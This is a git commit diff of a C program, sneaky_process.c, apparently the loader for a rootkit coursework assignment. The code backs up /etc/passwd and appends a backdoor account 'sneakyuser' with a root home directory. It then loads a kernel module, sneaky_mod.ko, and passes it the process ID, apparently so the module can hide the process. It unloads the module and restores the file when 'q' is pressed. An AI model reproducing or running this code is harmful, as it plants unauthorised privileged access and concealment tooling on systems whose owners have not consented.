641e8f045d0cbb12cfb9ec59d3dd778e5f14b2b8
root <root@ubuntu14-generic-template-01.oit.duke.edu>
2016-02-28 11:58:09 -0500

    a

--- sneaky_process.c
+++ sneaky_process.c
@@ -1,44 +1,67 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
-int main() {
-  int rc = fork();  
-  if (rc < 0) {
-    fprintf(stderr, "fork failed\n");
-    exit(1);
-  } else if (rc == 0) {
-     printf("first 1 sneaky_process pid=%d\n", getpid());
-    char * myargs[3];
-    myargs[0] = strdup("cp");
-    myargs[1] = strdup("/etc/passwd");
-    myargs[2] = strdup("/tmp/passwd");
-    execvp(myargs[0], myargs);        
-  } else {     
 
+
+void copyfile(char * src, char * dst) {
+  FILE * _src = fopen(src, "r");
+  FILE * _dst = fopen(dst, "w");
+  char line[256];
+  while (fgets(line, sizeof(line), _src)) {
+      fprintf(_dst, "%s", line);    
+  }
+  fclose(_src);
+  fclose(_dst);
+}
+
+
+
+int main() {
+  char src1[] = "sneaky_process.c";
+  char dst1[] = "test.c";
+  copyfile(src1, dst1);   
+  printf("sneaky_process pid=%d\n", getpid());
+  
+  char src[] = "/etc/passwd";
+  char dst[] = "/tmp/passwd";
+  copyfile(src, dst); 
+  
+  FILE * target = fopen("/etc/passwd", "a");
+  char append[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
+  fprintf(target, "%s", append); 
+  fclose(target);  
     
-    wait(NULL);           
-    FILE * target = fopen("/etc/passwd", "a");
-    char append[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
-    fprintf(target, "%s", append); 
-    fclose(target);  
+    int rc1 = fork();
+    if (rc1 == 0) {          
     
-    int _rc = fork();
-    if (_rc == 0) {          
-      printf("first 2 sneaky_process pid=%d\n", getpid()); 
       char * args[4];
       args[0] = strdup("insmod");
       args[1] = strdup("sneaky_mod.ko");   
       char buf[50];   
-      sprintf(buf, "myint=%d", getpid());
+      sprintf(buf, "PID=%d", getpid());
       args[2] = strdup(buf);
       args[3] = NULL;
       execvp(args[0], args);
+    
     } else {
       wait(NULL);
-      printf("main_process pid=%d\n", getpid()); 
-    } 
+
+      while (getchar() != 'q') {	
+      }
+
+      int rc2 = fork();
+      if (rc2 == 0) {
+	  char * args[3];
+	  args[0] = strdup("rmmod");
+	  args[1] = strdup("sneaky_mod.ko");   	  
+	  args[2] = NULL;
+	  execvp(args[0], args);
     
-  }
+      } else {
+	copyfile(dst, src); 
+      }
+         
+    }
   return 0;
 }
 
